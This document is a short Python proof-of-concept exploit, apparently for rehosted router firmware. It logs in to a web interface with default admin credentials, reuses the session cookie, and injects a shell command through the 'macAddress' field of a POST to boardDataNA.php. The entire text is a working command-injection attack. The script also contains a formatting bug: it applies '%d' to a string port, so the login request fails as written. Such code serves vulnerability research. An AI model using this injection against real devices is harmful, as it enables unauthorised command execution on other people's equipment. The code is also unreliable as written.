import requests
import random
import os
import sys
# NOTE: REMOVE COOKIE.TXT WHEN YOU RESTART THE REHOSTED FIRMARE

HOST = sys.argv[1]
PORT = sys.argv[2]

# Login
try:
    PHPSESSID = open('cookie.txt','r').read()
except FileNotFoundError:
    i = random.randint(10000, 99999)
    r = requests.get("http://%s:%d/login.php?username=admin&password=password&id=%s" % (HOST, PORT, i))
    print(r.text)
    PHPSESSID = r.headers['Set-Cookie'].split(';')[0]
    with open('cookie.txt', 'w') as f:
        f.write(PHPSESSID)

# Attack
params = {
    'macAddress': "112233445566;ls>/tmp/eee;",
    'reginfo': '1',
    'writeData': 'Submit'
}

headers = {
    "Cookie": "%s" % PHPSESSID
}

r = requests.post('http://%s:%s/boardDataNA.php' % (HOST, PORT), data=params, headers=headers)
print(r.text)
